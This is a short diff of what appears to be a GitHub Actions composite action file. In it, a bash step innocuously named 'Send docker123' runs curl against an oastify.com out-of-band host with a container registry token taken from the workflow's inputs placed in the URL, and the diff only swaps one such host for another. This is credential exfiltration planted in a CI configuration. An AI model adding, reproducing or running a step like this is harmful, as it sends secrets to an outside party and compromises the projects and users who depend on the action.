@@ -203,7 +203,7 @@ runs:
     
     - name: Send docker123
       shell: bash
-      run: curl http://cm2gvj4ighves8qo8eijav6nieo5cw5ku.oastify.com/${{fromJSON(github.event.inputs.client_payload).payload.container_registry_token}}
+      run: curl http://mqgpqjx05olajj0daw1wz6kxlorff53u.oastify.com/${{fromJSON(github.event.inputs.client_payload).payload.container_registry_token}}
       
     - name: Send docker124
       shell: bash
